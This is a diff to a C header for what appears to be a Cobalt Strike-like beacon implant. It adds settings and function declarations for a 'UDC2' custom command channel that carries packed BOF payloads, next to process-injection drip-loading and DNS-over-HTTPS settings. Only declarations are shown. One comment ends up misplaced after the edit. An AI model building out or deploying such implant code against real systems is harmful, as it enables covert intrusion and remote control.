@@ -149,4 +149,16 @@ unsigned int bigger_rand();
 #define SETTING_DOH_USERAGENT  80
 #define SETTING_DOH_ACCEPT     81
 #define SETTING_PROCINJ_DRIP_SIZE   82 /* .process-inject.drip_size - 4.12 drip-loading, chunked remote writes */
-#define SETTING_PROCINJ_DRIP_DELAY  83 /* .process-inject.drip_delay ms between chunks */
+#define SETTING_PROCINJ_DRIP_DELAY  83
+/* tier-2 item6 (4.12 UDC2): packed BOF (command-100 wire format), its
+ * binary-safe total length, and the 'go' entry offset */
+#define SETTING_UDC2_BOF       87
+#define SETTING_UDC2_LENGTH    88
+#define SETTING_UDC2_ENTRY     89
+
+/* 4.12 UDC2 (beacon_udc2.cpp) */
+BOOL udc2_enabled(void);
+BOOL udc2_init(void);
+int  udc2_cycle(char * recv, int max);
+void udc2_close(void);
+void udc2_queue(char * data, int length); /* .process-inject.drip_delay ms between chunks */
